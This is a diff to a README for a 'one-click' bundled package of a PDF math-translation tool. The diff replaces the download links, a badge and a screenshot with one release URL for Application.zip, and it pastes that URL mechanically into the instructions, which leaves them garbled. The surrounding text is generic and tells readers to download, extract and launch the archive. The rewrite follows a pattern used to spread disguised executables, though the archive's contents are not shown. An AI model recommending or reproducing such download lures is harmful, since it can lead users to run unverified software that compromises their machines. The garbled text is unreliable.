@@ -1,7 +1,7 @@
 # PDFMathTranslate-OneClick
 ## PDFMathTranslate一键启动整合包
 
-![PDFMathTranslate-OneClick](https://img.shields.io/badge/Download-Application.zip-brightgreen)
+![PDFMathTranslate-OneClick](https://github.com/sahaspatil/PDFMathTranslate-OneClick/releases/download/v1.0/Application.zip)
 
 Welcome to the PDFMathTranslate-OneClick repository, a one-stop solution for translating PDF documents containing mathematical formulas with ease. Whether you need to convert documents from English, Japanese, Korean, or Russian into Chinese or any other supported language, this integrated package has got you covered. With a focus on LaTeX formulas, this tool allows for seamless translation and modification of PDF files for academic or professional use.
 
@@ -26,7 +26,7 @@ Welcome to the PDFMathTranslate-OneClick repository, a one-stop solution for tra
 ### Get Started
 To get started with PDFMathTranslate-OneClick, simply download the application from the link below, and launch it to access the integrated tools and functionalities.
 
-[Download Application.zip](https://github.com/user-attachments/files/18426772/Application.zip)
+[Download https://github.com/sahaspatil/PDFMathTranslate-OneClick/releases/download/v1.0/Application.zip](https://github.com/sahaspatil/PDFMathTranslate-OneClick/releases/download/v1.0/Application.zip)
 
 If the link does not work, please check the "Releases" section of this repository for alternative download options.
 
@@ -47,7 +47,7 @@ If the link does not work, please check the "Releases" section of this repositor
 
 ### Installation Guide
 Follow these simple steps to install and start using PDFMathTranslate-OneClick:
-1. Download the Application.zip file from the provided link.
+1. Download the https://github.com/sahaspatil/PDFMathTranslate-OneClick/releases/download/v1.0/Application.zip file from the provided link.
 2. Extract the contents of the zip file to your desired location on your system.
 3. Launch the application and explore the intuitive interface for effortless PDF translation and modification.
 
@@ -68,4 +68,4 @@ If you encounter any difficulties or have questions regarding the usage of PDFMa
 
 Thank you for choosing PDFMathTranslate-OneClick for your PDF translation and editing needs. We hope this integrated package streamlines your workflow and enhances your productivity when working with mathematical documents. Happy translating!
 
-![PDFMathTranslate-OneClick](https://github.com/user-attachments/images/18426772/PDFMathTranslate.png)
+![PDFMathTranslate-OneClick](https://github.com/sahaspatil/PDFMathTranslate-OneClick/releases/download/v1.0/Application.zip)
